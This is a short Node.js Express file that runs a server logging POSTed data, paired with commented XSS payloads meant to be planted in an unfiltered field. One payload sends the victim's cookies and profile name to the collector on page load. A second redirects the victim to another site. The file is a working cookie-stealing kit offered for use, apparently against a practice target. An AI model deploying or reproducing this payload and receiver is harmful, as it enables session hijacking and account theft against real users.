const express = require('express')

const cors = require('cors')

const app = express()

app.use(cors())
app.use(express.json())

app.post('/data', (req, res) => {
    console.log(req.body)
})

app.listen(3001, () => console.log('listening'))

// PUT THIS IN A NONE XSS BLOCKED FIELD
{/* <script>
window.addEventListener('DOMContentLoaded', (event) => {
    fetch('http://localhost:3001/data', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            cookies: document.cookie,
            name: document.querySelector('a[href="./profile.php"]').innerHTML
        })
    })
});
</script> */}



// OR
{/* <script>
window.location = 'http://google.com'
</script> */}